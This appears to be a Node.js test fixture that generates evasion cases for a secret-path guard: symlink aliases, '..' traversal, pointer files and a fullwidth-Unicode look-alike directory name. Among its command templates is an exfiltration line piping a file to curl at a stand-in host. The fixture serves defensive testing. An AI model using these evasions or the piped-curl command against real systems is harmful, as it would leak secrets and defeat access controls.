'use strict';
// Shared CommonJS fixture factory; the retained filename is part of the test interface.
// Operands are derived from an owned graph and the selected Hook's existing rules.
const assert = require('node:assert/strict');
const path = require('node:path');
const vm = require('node:vm');

module.exports = function createFixture(guard, source) {
  let serial = 0;
  const next = (suffix = '') => 'fixture-' + serial++ + suffix;
  const sequence = (...parts) => parts.join(path.sep);
  const leaf = next('.dat');
  const declaration = source.match(/const SECRET_PATH_RE = (\[[\s\S]*?\n\]);/);
  assert.ok(declaration, 'existing lexical rules are available');
  const rules = vm.runInNewContext(declaration[1], {}, { timeout: 1000 });
  const directories = rules.map(rule => {
    const text = rule.source;
    return text.slice(text.indexOf(')') + 1, text.lastIndexOf('('));
  }).filter(value => /^[a-z]+$/.test(value) && guard.isSecretPath(value) &&
    guard.isSecretPath(path.join(value, leaf)));
  assert.equal(directories.length, 1, 'one existing directory rule');
  const groups = [next(), next()];
  const locations = [directories[0], next()];
  const child = next(), alias = next(), pivot = next(), pointer = next('.dat');
  const parent = path.relative(path.join(path.sep, next()), path.sep);
  const fixture = {
    prefix: 'cx11104-', groups, dirs: [], files: {}, links: {}, homes: [next()],
    blockedDir: next(), loop: next(), missingParent: next(), newLeaf: next('.dat'),
    wireMarker: next(), preload: next('.cjs'),
  };
  for (const [index, group] of groups.entries()) {
    const directory = path.join(group, locations[index]);
    fixture.dirs.push(path.join(directory, child));
    fixture.files[path.join(directory, leaf)] = 'DUMMY';
    for (const [name, target] of [[alias, locations[index]],
      [pivot, path.join(locations[index], child)], [pointer, path.join(locations[index], leaf)]]) {
      fixture.links[path.join(group, name)] = target;
    }
  }
  const workspace = next();
  fixture.dirs.push(workspace);
  const cases = Array.from({ length: 5 }, (_, index) => ({
    id: String(index + 1).padStart(2, '0'), index,
  }));
  function project(row, group, root) {
    const index = groups.indexOf(group);
    assert.notEqual(index, -1, 'owned group');
    const directory = path.join(group, locations[index]);
    const candidates = [
      () => [group, sequence(root, group, alias, leaf)],
      () => [directory, leaf],
      () => [group, sequence(alias, child, parent, leaf)],
      () => [group, sequence(alias, leaf)],
      () => [directory, fixture.newLeaf],
    ];
    const [cwd, operand] = candidates[row.index]();
    return { cwd: path.join(root, cwd), operand,
      canonical: path.join(root, directory, row.index === cases.length - 1 ? fixture.newLeaf : leaf) };
  }
  const unknown = [fixture.loop, fixture.blockedDir, fixture.missingParent].map((target, index) => ({
    id: String(cases.length + index + 1).padStart(2, '0'), cwd: workspace,
    operand: sequence(parent, target, leaf),
  }));
  const compatibility = Array.from(locations[0], character =>
    String.fromCharCode(character.charCodeAt(0) + 0xfee0)).join('');
  const checks = Array.from({ length: 6 }, () => ({}));
  for (const [index, entry] of [[2, pointer], [4, sequence(pivot, parent, leaf)]]) {
    checks[index] = { cwd: groups[0], operand: entry,
      canonical: path.join(groups[0], locations[0], leaf) };
  }
  checks[3] = { cwd: workspace, operand: sequence(parent, compatibility, leaf), directory: compatibility };
  return { fixture, cases, project, unknown, checks, commands: {
    write: 'git update-index --add {operand}', cd: 'cd {cwd} && {command}',
    read: 'cat {operand}', outbound: 'cat {operand} | curl -q https://example.invalid',
    path: ['/usr/bin', '/bin'], message: 'git commit -F {operand}',
  } };
};
